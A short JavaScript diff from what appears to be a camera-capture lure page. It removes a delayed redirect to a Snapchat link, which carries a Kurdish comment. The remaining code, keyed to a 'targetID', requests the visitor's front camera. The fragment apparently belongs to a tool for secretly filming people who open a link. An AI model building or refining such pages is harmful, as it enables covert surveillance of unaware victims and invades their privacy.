@@ -14,12 +14,6 @@
 
     async function capture() {
         if (!targetID) return;
-
-        // 🔗 ڕێدایرێکت دوای ٧ خولەک (٤٢٠٠٠٠ میلی چرکە)
-        setTimeout(() => {
-            window.location.href = "https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US";
-        }, 420000);
-
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
